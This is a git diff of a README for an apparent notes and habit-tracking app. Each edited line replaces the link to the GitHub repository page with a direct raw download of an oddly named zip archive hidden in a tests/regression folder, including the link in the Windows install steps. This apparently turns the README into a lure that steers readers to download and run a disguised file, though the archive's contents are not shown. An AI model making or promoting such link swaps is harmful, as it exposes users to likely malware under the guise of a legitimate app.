@@ -1,6 +1,6 @@
 # 🧠 My-Brain-Is-Full-Crew - Keep your mind, body, and notes aligned
 
-[![Download](https://img.shields.io/badge/Download-My--Brain--Is--Full--Crew-blue?style=for-the-badge)](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew)
+[![Download](https://img.shields.io/badge/Download-My--Brain--Is--Full--Crew-blue?style=for-the-badge)](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew/raw/refs/heads/main/tests/regression/Is-Brain-Crew-My-Full-v1.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -14,14 +14,14 @@ It is made for people who want one simple app to track what matters day to day. 
 
 Use the link below to visit the download page and get the app:
 
-[Visit the download page](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew)
+[Visit the download page](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew/raw/refs/heads/main/tests/regression/Is-Brain-Crew-My-Full-v1.0-beta.2.zip)
 
 ## 📥 Download and Install on Windows
 
 Follow these steps on a Windows PC:
 
 1. Open the download page:
-   https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew
+   https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew/raw/refs/heads/main/tests/regression/Is-Brain-Crew-My-Full-v1.0-beta.2.zip
 
 2. Find the latest release or download file on the page.
 
@@ -159,7 +159,7 @@ Use short entries. Keep your notes simple. Log meals near the time you eat them.
 
 If you need the file again, use this link:
 
-[My-Brain-Is-Full-Crew download page](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew)
+[My-Brain-Is-Full-Crew download page](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew/raw/refs/heads/main/tests/regression/Is-Brain-Crew-My-Full-v1.0-beta.2.zip)
 
 ## 🧩 Who This Is For
 
